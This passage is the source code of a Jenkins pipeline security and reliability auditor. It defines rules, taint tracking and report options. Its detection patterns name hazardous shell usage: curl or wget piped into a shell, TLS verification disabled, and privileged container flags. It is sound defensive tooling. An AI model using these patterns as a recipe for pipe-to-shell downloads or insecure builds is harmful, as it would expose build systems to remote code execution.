import groovy.json.JsonOutput
import groovy.json.JsonSlurper
import org.codehaus.groovy.ast.AnnotatedNode
import org.codehaus.groovy.ast.AnnotationNode
import org.codehaus.groovy.ast.ClassNode
import org.codehaus.groovy.ast.CodeVisitorSupport
import org.codehaus.groovy.ast.MethodNode
import org.codehaus.groovy.ast.ModuleNode
import org.codehaus.groovy.ast.expr.BinaryExpression
import org.codehaus.groovy.ast.expr.CastExpression
import org.codehaus.groovy.ast.expr.ClosureExpression
import org.codehaus.groovy.ast.expr.ConstantExpression
import org.codehaus.groovy.ast.expr.ConstructorCallExpression
import org.codehaus.groovy.ast.expr.DeclarationExpression
import org.codehaus.groovy.ast.expr.EmptyExpression
import org.codehaus.groovy.ast.expr.Expression
import org.codehaus.groovy.ast.expr.GStringExpression
import org.codehaus.groovy.ast.expr.ListExpression
import org.codehaus.groovy.ast.expr.MapEntryExpression
import org.codehaus.groovy.ast.expr.MapExpression
import org.codehaus.groovy.ast.expr.MethodCallExpression
import org.codehaus.groovy.ast.expr.PropertyExpression
import org.codehaus.groovy.ast.expr.TernaryExpression
import org.codehaus.groovy.ast.expr.TupleExpression
import org.codehaus.groovy.ast.expr.VariableExpression
import org.codehaus.groovy.ast.stmt.BlockStatement
import org.codehaus.groovy.ast.stmt.CatchStatement
import org.codehaus.groovy.ast.stmt.ExpressionStatement
import org.codehaus.groovy.ast.stmt.Statement
import org.codehaus.groovy.ast.stmt.ThrowStatement
import org.codehaus.groovy.ast.stmt.TryCatchStatement
import org.codehaus.groovy.control.CompilationUnit
import org.codehaus.groovy.control.CompilerConfiguration
import org.codehaus.groovy.control.MultipleCompilationErrorsException
import org.codehaus.groovy.control.Phases
import org.codehaus.groovy.control.SourceUnit
import org.codehaus.groovy.control.messages.SyntaxErrorMessage

import java.nio.charset.CodingErrorAction
import java.nio.charset.StandardCharsets
import java.nio.file.FileVisitResult
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.Paths
import java.nio.file.SimpleFileVisitor
import java.nio.file.StandardCopyOption
import java.nio.file.attribute.BasicFileAttributes
import java.security.MessageDigest
import java.util.regex.Matcher
import java.util.regex.Pattern

class Exit extends RuntimeException {
    final int code
    Exit(int code, String message) {
        super(message)
        this.code = code
    }
}

enum Severity {
    LOW, MEDIUM, HIGH

    static Severity parse(String raw) {
        try {
            return valueOf(raw.toUpperCase(Locale.ROOT))
        } catch (IllegalArgumentException ignored) {
            throw new Exit(Config.EXIT_USAGE, "Unknown severity '${raw}', expected low, medium or high")
        }
    }
}

class Rule {
    final String id
    final String name
    final Severity severity
    final String summary
    final String fix

    Rule(String id, String name, Severity severity, String summary, String fix) {
        this.id = id
        this.name = name
        this.severity = severity
        this.summary = summary
        this.fix = fix
    }
}

class Rules {
    static final List<Rule> ALL = [
        new Rule('JPH001', 'secret-interpolation', Severity.HIGH,
            'A bound credential is interpolated by Groovy into a shell command.',
            'Use a single quoted string and let the shell expand the variable, for example sh \'curl -H "Authorization: $TOKEN" ...\'.'),
        new Rule('JPH002', 'secret-logged', Severity.MEDIUM,
            'A bound credential is passed to a step that writes to the build log.',
            'Do not print credentials. Log the credential id or a fixed marker instead.'),
        new Rule('JPH003', 'scm-value-interpolation', Severity.HIGH,
            'A value an SCM contributor controls is interpolated by Groovy into a shell command.',
            'Use a single quoted string and read the value from the environment, for example sh \'git checkout "$CHANGE_BRANCH"\'.'),
        new Rule('JPH004', 'param-interpolation', Severity.MEDIUM,
            'A free text build parameter is interpolated by Groovy into a shell command.',
            'Use a single quoted string and read the parameter from the environment, or switch the parameter to a choice or boolean.'),
        new Rule('JPH005', 'dynamic-code', Severity.HIGH,
            'The pipeline compiles or loads code at run time.',
            'Move the logic into a pinned shared library. Never build the script text or path from parameters or SCM values.'),
        new Rule('JPH006', 'library-pinning', Severity.MEDIUM,
            'A shared library is loaded without an immutable version.',
            'Pin the library to a tag or a full commit SHA, for example @Library(\'name@v1.4.2\').'),
        new Rule('JPH007', 'controller-side-api', Severity.MEDIUM,
            'The code calls a JVM API that runs inside the Jenkins controller, not on the agent.',
            'Use pipeline steps (sh, readFile, writeFile, httpRequest, sleep) so the work happens on the agent.'),
        new Rule('JPH008', 'tls-verification-off', Severity.MEDIUM,
            'A shell command turns off TLS certificate verification.',
            'Install the right CA bundle on the agent and remove the flag.'),
        new Rule('JPH009', 'pipe-to-shell', Severity.MEDIUM,
            'A shell command downloads a script and pipes it straight into an interpreter.',
            'Download to a file, verify a pinned checksum, then execute it.'),
        new Rule('JPH010', 'privileged-container', Severity.MEDIUM,
            'A container is started with host level access.',
            'Drop the flag, or move the job to a dedicated single use agent.'),
        new Rule('JPH011', 'unpinned-image', Severity.LOW,
            'A container image is referenced without a fixed tag or digest.',
            'Pin the image to a version tag or an @sha256 digest.'),
        new Rule('JPH012', 'controller-executor', Severity.MEDIUM,
            'The build can run on the controller or on any executor.',
            'Request a specific agent label and keep zero executors on the built-in node.'),
        new Rule('JPH020', 'noncps-calls-step', Severity.HIGH,
            'A @NonCPS method calls a pipeline step or a CPS transformed method.',
            'Keep @NonCPS methods pure. Return data from them and call steps from the CPS caller.'),
        new Rule('JPH021', 'cps-unsafe-closure', Severity.MEDIUM,
            'A closure is passed to a JDK or GDK method that the CPS interpreter cannot drive.',
            'Move the call into a @NonCPS helper method.'),
        new Rule('JPH022', 'nonserializable-local', Severity.MEDIUM,
            'A non serializable object is still in scope when a pipeline step runs.',
            'Extract the values you need inside a @NonCPS method, or set the variable to null before the step. For JSON use readJSON or JsonSlurperClassic.'),
        new Rule('JPH023', 'swallowed-abort', Severity.MEDIUM,
            'A broad catch around pipeline steps swallows abort and timeout signals.',
            'Catch FlowInterruptedException first and rethrow it, or rethrow at the end of the catch block. catchError does this for you.'),
        new Rule('JPH030', 'input-holds-executor', Severity.MEDIUM,
            'An input prompt waits for a human while an executor and its workspace stay allocated.',
            'Move input outside node, or use agent none at pipeline level with per stage agents.'),
        new Rule('JPH031', 'unbounded-wait', Severity.MEDIUM,
            'A step that waits on an outside event has no timeout around it.',
            'Wrap it in timeout(time: N, unit: \'MINUTES\') { ... } or add a stage level options { timeout(...) }.'),
        new Rule('JPH032', 'no-timeout', Severity.LOW,
            'The pipeline has no overall timeout.',
            'Add options { timeout(time: N, unit: \'MINUTES\') } or wrap the node block in timeout.'),
        new Rule('JPH033', 'no-build-discarder', Severity.LOW,
            'The declarative pipeline keeps every build forever.',
            'Add options { buildDiscarder(logRotator(numToKeepStr: \'30\')) }.'),
        new Rule('JPH034', 'ignored-exit-status', Severity.MEDIUM,
            'A shell step asks for returnStatus and then discards the result.',
            'Assign the status and check it, or drop returnStatus so a non zero exit fails the build.'),
        new Rule('JPH035', 'pipe-masks-failure', Severity.LOW,
            'A shell pipeline without pipefail reports only the exit code of its last command.',
            'Start the script with set -o pipefail (and a bash shebang), or split the pipeline.'),
        new Rule('JPH036', 'failure-suppressed', Severity.LOW,
            'A shell command forces a zero exit code.',
            'Handle the specific expected failure instead of || true or set +e.')
    ].asImmutable()

    static final Map<String, Rule> BY_ID = ALL.collectEntries { Rule r -> [(r.id): r] }.asImmutable()

    static Rule get(String id) {
        Rule r = BY_ID[id]
        if (r == null) {
            throw new IllegalStateException("Unknown rule ${id}")
        }
        return r
    }
}

class Finding {
    Rule rule
    Severity severity
    String file
    int line
    int column
    String message
    String snippet
    String fingerprint
    boolean suppressed
    boolean baselined

    boolean isActive() {
        return !suppressed && !baselined
    }
}

class ParseFailure {
    String file
    int line
    String message
}

class Config {
    static final String VERSION = '1.0.0'
    static final int EXIT_OK = 0
    static final int EXIT_FINDINGS = 1
    static final int EXIT_USAGE = 2
    static final int EXIT_UNPARSED = 3
    static final long MAX_FILE_BYTES = 2L * 1024L * 1024L
    static final Set<String> FORMATS = ['text', 'json', 'sarif', 'github'] as Set
    static final Set<String> SKIP_DIRS = ['.git', '.hg', '.svn', 'node_modules', 'build', 'target', 'out',
                                          '.gradle', '.idea', 'vendor', 'dist'] as Set

    List<Path> inputs = []
    String format = 'text'
    Path out
    Severity failOn = Severity.MEDIUM
    boolean failOnNone = false
    Severity minSeverity = Severity.LOW
    Set<String> disabled = [] as Set
    Set<String> only = [] as Set
    Set<String> extraSteps = [] as Set
    Set<String> trustedParams = [] as Set
    Path baseline
    Path writeBaseline
    boolean allowUnparsed = false
    boolean includeGroovy = false
    boolean listRules = false
    boolean help = false

    static String usage() {
        return '''Usage: groovy JenkinsPipelineHazardAuditor.groovy [options] <file-or-dir>...

Audits Jenkinsfiles and shared library code for secret leaks, command injection,
CPS traps and steps that can hang a build forever.

Directories are searched for Jenkinsfile, Jenkinsfile.*, *.jenkinsfile and vars/*.groovy.

Options:
  --format text|json|sarif|github   Output format (default text)
  --out FILE                        Write the report to FILE instead of stdout
  --fail-on high|medium|low|none    Lowest severity that fails the run (default medium)
  --min-severity high|medium|low    Hide findings below this severity (default low)
  --disable ID[,ID]                 Turn rules off
  --only ID[,ID]                    Run only these rules
  --step NAME[,NAME]                Treat extra names as pipeline steps (plugin or shared library steps)
  --trusted-param NAME[,NAME]       Build parameters that are validated elsewhere
  --baseline FILE                   Do not fail on findings recorded in FILE
  --write-baseline FILE             Record current findings in FILE and exit 0
  --include-groovy                  Also scan every .groovy file under the given directories
  --allow-unparsed                  Do not fail when a file cannot be parsed
  --list-rules                      Print the rule table and exit
  --help                            Print this text

Suppress one finding with a comment on the same line or the line above:
  // jph:ignore JPH003 branch names are validated by the webhook filter

Exit codes: 0 clean, 1 findings at or above --fail-on, 2 usage or IO error, 3 unparsed input.
'''
    }

    static Config parse(String[] argv) {
        Config c = new Config()
        List<String> args = argv as List<String>
        int i = 0
        Closure<String> value = { String flag ->
            if (i + 1 >= args.size()) {
                throw new Exit(EXIT_USAGE, "${flag} needs a value")
            }
            i++
            return args[i]
        }
        Closure<List<String>> csv = { String raw ->
            raw.split(',').collect { String s -> s.trim() }.findAll { String s -> !s.isEmpty() }
        }
        while (i < args.size()) {
            String a = args[i]
            switch (a) {
                case '--help': case '-h': c.help = true; break
                case '--list-rules': c.listRules = true; break
                case '--format':
                    c.format = value(a)
                    if (!FORMATS.contains(c.format)) {
                        throw new Exit(EXIT_USAGE, "Unknown format '${c.format}', expected one of ${FORMATS.join(', ')}")
                    }
                    break
                case '--out': c.out = Paths.get(value(a)); break
                case '--fail-on':
                    String v = value(a)
                    if (v.equalsIgnoreCase('none')) {
                        c.failOnNone = true
                    } else {
                        c.failOn = Severity.parse(v)
                    }
                    break
                case '--min-severity': c.minSeverity = Severity.parse(value(a)); break
                case '--disable': c.disabled.addAll(ruleIds(csv(value(a)))); break
                case '--only': c.only.addAll(ruleIds(csv(value(a)))); break
                case '--step': c.extraSteps.addAll(csv(value(a))); break
                case '--trusted-param': c.trustedParams.addAll(csv(value(a))); break
                case '--baseline': c.baseline = Paths.get(value(a)); break
                case '--write-baseline': c.writeBaseline = Paths.get(value(a)); break
                case '--include-groovy': c.includeGroovy = true; break
                case '--allow-unparsed': c.allowUnparsed = true; break
                default:
                    if (a.startsWith('--')) {
                        throw new Exit(EXIT_USAGE, "Unknown option ${a}")
                    }
                    c.inputs << Paths.get(a)
            }
            i++
        }
        if (!c.help && !c.listRules && c.inputs.isEmpty()) {
            throw new Exit(EXIT_USAGE, 'No input given. Pass at least one Jenkinsfile or directory.')
        }
        return c
    }

    private static List<String> ruleIds(List<String> raw) {
        return raw.collect { String id ->
            String up = id.toUpperCase(Locale.ROOT)
            if (!Rules.BY_ID.containsKey(up)) {
                throw new Exit(EXIT_USAGE, "Unknown rule id '${id}'. Run with --list-rules.")
            }
            up
        }
    }

    boolean enabled(Rule r) {
        if (disabled.contains(r.id)) {
            return false
        }
        return only.isEmpty() || only.contains(r.id)
    }
}

class SourceFile {
    static final Pattern IGNORE = Pattern.compile('jph:ignore\\b([^\\n]*)')
    static final Pattern RULE_ID = Pattern.compile('\\bJPH\\d{3}\\b')

    final Path path
    final String display
    final String text
    final List<String> lines
    private final Map<Integer, Set<String>> suppressions = [:]

    SourceFile(Path path, String display, String text) {
        this.path = path
        this.display = display
        this.text = text
        this.lines = text.split('\\r?\\n', -1) as List<String>
        indexSuppressions()
    }

    private void indexSuppressions() {
        lines.eachWithIndex { String raw, int idx ->
            Matcher m = IGNORE.matcher(raw)
            if (!m.find()) {
                return
            }
            Set<String> ids = [] as Set
            Matcher idm = RULE_ID.matcher(m.group(1))
            while (idm.find()) {
                ids << idm.group()
            }
            if (ids.isEmpty()) {
                ids << '*'
            }
            int lineNo = idx + 1
            merge(lineNo, ids)
            String trimmed = raw.trim()
            if (trimmed.startsWith('//') || trimmed.startsWith('/*') || trimmed.startsWith('*')) {
                merge(lineNo + 1, ids)
            }
        }
    }

    private void merge(int lineNo, Set<String> ids) {
        Set<String> cur = suppressions[lineNo]
        if (cur == null) {
            suppressions[lineNo] = new LinkedHashSet<String>(ids)
        } else {
            cur.addAll(ids)
        }
    }

    boolean isSuppressed(int lineNo, String ruleId) {
        Set<String> ids = suppressions[lineNo]
        return ids != null && (ids.contains('*') || ids.contains(ruleId))
    }

    String lineAt(int lineNo) {
        if (lineNo < 1 || lineNo > lines.size()) {
            return ''
        }
        return lines[lineNo - 1]
    }
}

class Ast {
    static List<Expression> positional(Expression args) {
        if (!(args instanceof TupleExpression)) {
            return args == null ? [] : [args]
        }
        return ((TupleExpression) args).expressions.findAll { Expression e -> !(e instanceof MapExpression) }
    }

    static Map<String, Expression> named(Expression args) {
        Map<String, Expression> out = [:]
        if (args instanceof TupleExpression) {
            for (Expression e : ((TupleExpression) args).expressions) {
                if (e instanceof MapExpression) {
                    for (MapEntryExpression me : ((MapExpression) e).mapEntryExpressions) {
                        String k = constString(me.keyExpression)
                        if (k != null) {
                            out[k] = me.valueExpression
                        }
                    }
                }
            }
        }
        return out
    }

    static String constString(Expression e) {
        if (e instanceof ConstantExpression && !(e instanceof EmptyExpression)) {
            Object v = ((ConstantExpression) e).value
            return v instanceof CharSequence ? v.toString() : null
        }
        return null
    }

    static boolean constTrue(Expression e) {
        return e instanceof ConstantExpression && Boolean.TRUE == ((ConstantExpression) e).value
    }

    static String dotted(Expression e) {
        if (e instanceof VariableExpression) {
            return ((VariableExpression) e).name
        }
        if (e instanceof PropertyExpression) {
            PropertyExpression p = (PropertyExpression) e
            String left = dotted(p.objectExpression)
            String right = p.propertyAsString
            return (left != null && right != null) ? left + '.' + right : null
        }
        return null
    }

    static ClosureExpression closureArg(MethodCallExpression c) {
        List<Expression> pos = positional(c.arguments)
        if (!pos.isEmpty() && pos.last() instanceof ClosureExpression) {
            return (ClosureExpression) pos.last()
        }
        return null
    }

    static List<Statement> statements(ClosureExpression c) {
        if (c == null || c.code == null) {
            return []
        }
        if (c.code instanceof BlockStatement) {
            return ((BlockStatement) c.code).statements
        }
        return [c.code]
    }

    static List<MethodCallExpression> directCalls(ClosureExpression c) {
        List<MethodCallExpression> out = []
        for (Statement s : statements(c)) {
            if (s instanceof ExpressionStatement && ((ExpressionStatement) s).expression instanceof MethodCallExpression) {
                out << (MethodCallExpression) ((ExpressionStatement) s).expression
            }
        }
        return out
    }

    static Set<String> bindingNames(MethodCallExpression withCredentials) {
        Set<String> names = new LinkedHashSet<String>()
        CodeVisitorSupport v = new CodeVisitorSupport() {
            @Override
            void visitMapEntryExpression(MapEntryExpression me) {
                String k = Ast.constString(me.keyExpression)
                String val = Ast.constString(me.valueExpression)
                if (k != null && val != null && !val.isEmpty() && k.toLowerCase(Locale.ROOT).endsWith('variable')) {
                    names << val
                }
                super.visitMapEntryExpression(me)
            }

            @Override
            void visitClosureExpression(ClosureExpression ce) {
            }
        }
        withCredentials.arguments.visit(v)
        return names
    }

    static Set<String> environmentCredentials(ClosureExpression env) {
        Set<String> names = new LinkedHashSet<String>()
        for (Statement s : statements(env)) {
            if (!(s instanceof ExpressionStatement)) {
                continue
            }
            Expression e = ((ExpressionStatement) s).expression
            if (e instanceof BinaryExpression && ((BinaryExpression) e).operation.text == '=') {
                BinaryExpression b = (BinaryExpression) e
                if (b.leftExpression instanceof VariableExpression && b.rightExpression instanceof MethodCallExpression &&
                    ((MethodCallExpression) b.rightExpression).methodAsString == 'credentials') {
                    String n = ((VariableExpression) b.leftExpression).name
                    names << n
                    names << n + '_USR'
                    names << n + '_PSW'
                }
            }
        }
        return names
    }

    static String staticText(Expression e) {
        if (e instanceof GStringExpression) {
            GStringExpression g = (GStringExpression) e
            StringBuilder sb = new StringBuilder()
            for (int i = 0; i < g.strings.size(); i++) {
                sb.append(String.valueOf(g.strings[i].value))
                if (i < g.values.size()) {
                    sb.append('$_')
                }
            }
            return sb.toString()
        }
        if (e instanceof ConstantExpression) {
            Object v = ((ConstantExpression) e).value
            return v == null ? '' : v.toString()
        }
        if (e instanceof BinaryExpression && ((BinaryExpression) e).operation.text == '+') {
            return staticText(((BinaryExpression) e).leftExpression) + staticText(((BinaryExpression) e).rightExpression)
        }
        if (e instanceof MethodCallExpression) {
            MethodCallExpression m = (MethodCallExpression) e
            if (m.methodAsString in ['stripIndent', 'stripMargin', 'trim', 'toString']) {
                return staticText(m.objectExpression)
            }
        }
        return '$_'
    }

    static boolean isStringBuilding(Expression e) {
        if (e instanceof GStringExpression || constString(e) != null || e instanceof ListExpression) {
            return true
        }
        return e instanceof BinaryExpression && ((BinaryExpression) e).operation.text == '+' &&
            (isStringBuilding(((BinaryExpression) e).leftExpression) || isStringBuilding(((BinaryExpression) e).rightExpression))
    }
}

class Vocabulary {
    static final Set<String> SHELL_STEPS = ['sh', 'bat', 'powershell', 'pwsh'] as Set
    static final Set<String> LOG_STEPS = ['echo', 'println', 'print', 'error', 'unstable', 'warnError'] as Set
    static final Set<String> STEP_RECEIVERS = ['steps', 'script', 'this', 'pipeline', 'ctx', 'context', 'dsl'] as Set
    static final Set<String> NONCPS_TOLERATED = ['echo', 'error', 'println', 'print'] as Set
    static final Set<String> WAIT_STEPS = ['input', 'waitUntil', 'waitForQualityGate'] as Set

    static final Set<String> STEPS = [
        'sh', 'bat', 'powershell', 'pwsh', 'echo', 'error', 'unstable', 'catchError', 'warnError', 'checkout', 'git',
        'stash', 'unstash', 'archiveArtifacts', 'archive', 'junit', 'input', 'timeout', 'retry', 'sleep', 'node',
        'stage', 'parallel', 'withCredentials', 'withEnv', 'dir', 'ws', 'writeFile', 'readFile', 'fileExists',
        'deleteDir', 'cleanWs', 'build', 'lock', 'milestone', 'waitUntil', 'waitForQualityGate', 'withSonarQubeEnv',
        'publishHTML', 'emailext', 'mail', 'slackSend', 'sshagent', 'container', 'podTemplate', 'dockerNode',
        'readJSON', 'writeJSON', 'readYaml', 'writeYaml', 'readProperties', 'readCSV', 'writeCSV', 'readMavenPom',
        'writeMavenPom', 'httpRequest', 'tool', 'isUnix', 'pwd', 'load', 'library', 'libraryResource', 'properties',
        'wrap', 'step', 'timestamps', 'ansiColor', 'withMaven', 'withGradle', 'withDockerRegistry',
        'withDockerServer', 'withDockerContainer', 'withKubeConfig', 'withAWS', 'findFiles', 'zip', 'unzip', 'tar',
        'untar', 'sha256', 'sha1', 'tee', 'touch', 'recordIssues', 'publishChecks', 'withChecks', 'githubNotify',
        'updateGitlabCommitStatus', 'gitlabCommitStatus', 'bitbucketStatusNotify', 'nexusArtifactUploader',
        's3Upload', 's3Download', 'copyArtifacts', 'fingerprint', 'validateDeclarativePipeline', 'getContext',
        'withContext', 'script', 'office365ConnectorSend', 'rtUpload', 'rtDownload', 'kubernetesDeploy', 'sshPublisher'
    ] as Set

    static final Set<String> SCM_ENV = [
        'BRANCH_NAME', 'CHANGE_BRANCH', 'CHANGE_TARGET', 'CHANGE_TITLE', 'CHANGE_AUTHOR', 'CHANGE_AUTHOR_DISPLAY_NAME',
        'CHANGE_AUTHOR_EMAIL', 'CHANGE_FORK', 'CHANGE_URL', 'TAG_NAME', 'GIT_BRANCH', 'GIT_LOCAL_BRANCH',
        'GIT_AUTHOR_NAME', 'GIT_AUTHOR_EMAIL', 'GIT_COMMITTER_NAME', 'GIT_COMMITTER_EMAIL',
        'ghprbPullTitle', 'ghprbSourceBranch', 'ghprbTargetBranch', 'ghprbPullAuthorLogin', 'ghprbPullAuthorEmail',
        'ghprbCommentBody', 'ghprbPullDescription', 'ghprbPullLongDescription', 'ghprbActualCommitAuthor',
        'ghprbActualCommitAuthorEmail', 'ghprbTriggerAuthor', 'ghprbTriggerAuthorLogin',
        'gitlabSourceBranch', 'gitlabTargetBranch', 'gitlabBranch', 'gitlabMergeRequestTitle',
        'gitlabMergeRequestDescription', 'gitlabUserName', 'gitlabUserEmail', 'gitlabSourceRepoName',
        'gitlabTriggerPhrase', 'gitlabMergeRequestLastCommit',
        'GERRIT_CHANGE_SUBJECT', 'GERRIT_BRANCH', 'GERRIT_REFSPEC', 'GERRIT_TOPIC', 'GERRIT_CHANGE_OWNER_NAME',
        'GERRIT_CHANGE_OWNER_EMAIL', 'GERRIT_EVENT_COMMENT_TEXT', 'GERRIT_PATCHSET_UPLOADER_NAME',
        'BITBUCKET_SOURCE_BRANCH', 'BITBUCKET_TARGET_BRANCH', 'BITBUCKET_PULL_REQUEST_TITLE', 'BITBUCKET_ACTOR'
    ] as Set

    static final Set<String> SAFE_PARAM_KINDS = ['booleanParam', 'choice'] as Set
    static final Set<String> PARAM_KINDS = ['string', 'text', 'booleanParam', 'choice', 'password', 'file',
                                           'credentials', 'gitParameter', 'extendedChoice', 'run',
                                           'stashedFile', 'base64File', 'validatingString'] as Set

    static final Set<String> NEUTRALIZING_METHODS = [
        'toInteger', 'toLong', 'toBoolean', 'toDouble', 'toFloat', 'toBigDecimal', 'toBigInteger', 'isInteger',
        'isNumber', 'size', 'length', 'isEmpty', 'contains', 'equals', 'equalsIgnoreCase', 'startsWith', 'endsWith',
        'matches', 'hashCode', 'compareTo', 'asBoolean', 'count', 'indexOf', 'isBlank', 'containsKey'
    ] as Set

    static final Set<String> NEUTRALIZING_TYPES = ['int', 'Integer', 'long', 'Long', 'boolean', 'Boolean', 'double',
                                                   'Double', 'float', 'Float', 'BigDecimal', 'BigInteger',
                                                   'short', 'Short'] as Set

    static final Set<String> CPS_UNSAFE_CLOSURE_METHODS = ['sort', 'toSorted', 'unique', 'toUnique', 'max', 'min',
                                                           'removeAll', 'retainAll', 'removeIf', 'sortBy'] as Set

    static final Set<String> MUTABLE_REFS = ['main', 'master', 'develop', 'development', 'dev', 'trunk', 'latest',
                                             'head', 'stable', 'staging', 'next', 'prod', 'production',
                                             'release', 'current'] as Set

    static final Set<String> CONTROLLER_LABELS = ['master', 'built-in', 'builtin', 'controller'] as Set

    static final List<Pattern> TLS_OFF = [
        Pattern.compile('\\bcurl\\b[^\\n|;&]*\\s(?:-[a-zA-Z]*k[a-zA-Z]*|--insecure)(?=\\s|$)'),
        Pattern.compile('\\bwget\\b[^\\n|;&]*--no-check-certificate'),
        Pattern.compile('http\\.sslVerify[= ]+false'),
        Pattern.compile('GIT_SSL_NO_VERIFY=(?:1|true)'),
        Pattern.compile('strict-ssl[= ]+false'),
        Pattern.compile('NODE_TLS_REJECT_UNAUTHORIZED=0'),
        Pattern.compile('\\bpip3?\\b[^\\n|;&]*--trusted-host'),
        Pattern.compile('--insecure-skip-tls-verify(?:=true)?(?=\\s|$)'),
        Pattern.compile('PYTHONHTTPSVERIFY=0'),
        Pattern.compile('-Dmaven\\.wagon\\.http\\.ssl\\.insecure=true')
    ].asImmutable()

    static final Pattern PIPE_TO_SHELL = Pattern.compile(
        '\\b(?:curl|wget)\\b[^\\n;&]*\\|\\s*(?:sudo\\s+(?:-\\S+\\s+)*)?(?:env\\s+)?(?:ba|z|k|da)?sh\\b|' +
        '\\b(?:curl|wget)\\b[^\\n;&]*\\|\\s*(?:sudo\\s+)?(?:python[0-9.]*|perl|ruby|node)\\b|' +
        '\\b(?:ba)?sh\\s+-c\\s+["\']?\\$\\((?:curl|wget)\\b|' +
        '\\b(?:ba)?sh\\s+<\\(\\s*(?:curl|wget)\\b')

    static final Pattern FORCED_SUCCESS = Pattern.compile('\\|\\|\\s*(?:true|:|exit\\s+0)(?=\\s|;|$|\\))|(?m)^\\s*set\\s+\\+e\\b')

    static final List<Pattern> PRIVILEGED = [
        Pattern.compile('--privileged\\b'),
        Pattern.compile('/var/run/docker\\.sock'),
        Pattern.compile('--(?:net|network)[= ]host\\b'),
        Pattern.compile('--pid[= ]host\\b'),
        Pattern.compile('--ipc[= ]host\\b'),
        Pattern.compile('--cap-add[= ](?:ALL|SYS_ADMIN|SYS_PTRACE|NET_ADMIN)\\b'),
        Pattern.compile('--security-opt[= ]\\S*unconfined'),
        Pattern.compile('(?:-v|--volume)[= ]/:/')
    ].asImmutable()

    static final Set<String> PIPE_SAFE_PRODUCERS = ['echo', 'printf', 'cat', 'yes', 'true', ':', 'date'] as Set
}

class TaintRef {
    String kind
    String name
    String via
}

class Taint {
    static final String SECRET = 'SECRET'
    static final String SCM = 'SCM'
    static final String PARAM = 'PARAM'

    Map<String, String> paramKinds = [:]
    Set<String> trustedParams = [] as Set
    Set<String> allSecretNames = new LinkedHashSet<String>()
    Set<String> assignedNames = new HashSet<String>()
    Map<String, TaintRef> locals = [:]

    List<TaintRef> refs(Expression e, Set<String> activeSecrets) {
        List<TaintRef> out = []
        collect(e, activeSecrets, null, out)
        return out
    }

    private void collect(Expression e, Set<String> secrets, String via, List<TaintRef> out) {
        if (e == null || e instanceof ClosureExpression) {
            return
        }
        if (e instanceof GStringExpression) {
            for (Expression v : ((GStringExpression) e).values) {
                collect(v, secrets, via, out)
            }
            return
        }
        if (e instanceof VariableExpression) {
            String n = ((VariableExpression) e).name
            if (secrets.contains(n)) {
                out << new TaintRef(kind: SECRET, name: n, via: via)
            } else if (locals.containsKey(n)) {
                TaintRef src = locals[n]
                out << new TaintRef(kind: src.kind, name: "${n} (from ${src.name})".toString(), via: via ?: src.via)
            } else if (Vocabulary.SCM_ENV.contains(n) && !assignedNames.contains(n)) {
                out << new TaintRef(kind: SCM, name: n, via: via)
            } else if (n == 'params') {
                out << new TaintRef(kind: PARAM, name: 'params', via: via)
            }
            return
        }
        if (e instanceof PropertyExpression) {
            PropertyExpression p = (PropertyExpression) e
            String d = Ast.dotted(p)
            if (d != null && namedSource(d, secrets, via, out)) {
                return
            }
            collect(p.objectExpression, secrets, via, out)
            return
        }
        if (e instanceof BinaryExpression) {
            BinaryExpression b = (BinaryExpression) e
            if (b.operation.text == '[') {
                String base = Ast.dotted(b.leftExpression)
                String key = Ast.constString(b.rightExpression)
                if (base != null && key != null && namedSource(base + '.' + key, secrets, via, out)) {
                    return
                }
                collect(b.leftExpression, secrets, via, out)
                return
            }
            if (b.operation.text in ['==', '!=', '<', '>', '<=', '>=', '==~', '=~', 'in', 'instanceof', '&&', '||', '<=>']) {
                return
            }
            collect(b.leftExpression, secrets, via, out)
            collect(b.rightExpression, secrets, via, out)
            return
        }
        if (e instanceof MethodCallExpression) {
            MethodCallExpression m = (MethodCallExpression) e
            String name = m.methodAsString
            if (name != null && Vocabulary.NEUTRALIZING_METHODS.contains(name)) {
                return
            }
            if (!m.implicitThis) {
                collect(m.objectExpression, secrets, via, out)
            }
            String innerVia = via ?: (m.implicitThis ? name : null)
            if (m.arguments instanceof TupleExpression) {
                for (Expression a : ((TupleExpression) m.arguments).expressions) {
                    collect(a, secrets, m.implicitThis ? innerVia : via, out)
                }
            }
            return
        }
        if (e instanceof TernaryExpression) {
            TernaryExpression t = (TernaryExpression) e
            collect(t.trueExpression, secrets, via, out)
            collect(t.falseExpression, secrets, via, out)
            return
        }
        if (e instanceof CastExpression) {
            CastExpression c = (CastExpression) e
            if (Vocabulary.NEUTRALIZING_TYPES.contains(c.type.nameWithoutPackage)) {
                return
            }
            collect(c.expression, secrets, via, out)
            return
        }
        if (e instanceof ListExpression) {
            for (Expression x : ((ListExpression) e).expressions) {
                collect(x, secrets, via, out)
            }
            return
        }
        if (e instanceof MapExpression) {
            for (MapEntryExpression me : ((MapExpression) e).mapEntryExpressions) {
                collect(me.valueExpression, secrets, via, out)
            }
            return
        }
        if (e instanceof TupleExpression) {
            for (Expression x : ((TupleExpression) e).expressions) {
                collect(x, secrets, via, out)
            }
        }
    }

    private boolean namedSource(String dotted, Set<String> secrets, String via, List<TaintRef> out) {
        if (dotted.startsWith('params.')) {
            String rest = dotted.substring('params.'.length())
            String pname = rest.contains('.') ? rest.substring(0, rest.indexOf('.')) : rest
            if (trustedParams.contains(pname)) {
                return true
            }
            String kind = paramKinds[pname]
            if (kind == 'password') {
                out << new TaintRef(kind: SECRET, name: 'params.' + pname, via: via)
            } else if (kind == null || !Vocabulary.SAFE_PARAM_KINDS.contains(kind)) {
                out << new TaintRef(kind: PARAM, name: 'params.' + pname, via: via)
            }
            return true
        }
        if (dotted.startsWith('env.')) {
            String ename = dotted.substring('env.'.length())
            if (ename.contains('.')) {
                ename = ename.substring(0, ename.indexOf('.'))
            }
            if (secrets.contains(ename)) {
                out << new TaintRef(kind: SECRET, name: 'env.' + ename, via: via)
            } else if (locals.containsKey(ename)) {
                TaintRef src = locals[ename]
                out << new TaintRef(kind: src.kind, name: "env.${ename} (from ${src.name})".toString(), via: via ?: src.via)
            } else if (Vocabulary.SCM_ENV.contains(ename)) {
                out << new TaintRef(kind: SCM, name: 'env.' + ename, via: via)
            }
            return true
        }
        return false
    }

    void solveLocals(List<Map> assignments) {
        boolean changed = true
        int rounds = 0
        while (changed && rounds < 12) {
            changed = false
            rounds++
            for (Map a : assignments) {
                String name = (String) a.name
                List<TaintRef> found = refs((Expression) a.rhs, allSecretNames)
                if (found.isEmpty()) {
                    continue
                }
                TaintRef best = found.find { TaintRef r -> r.kind == SECRET } ?:
                    found.find { TaintRef r -> r.kind == SCM } ?: found[0]
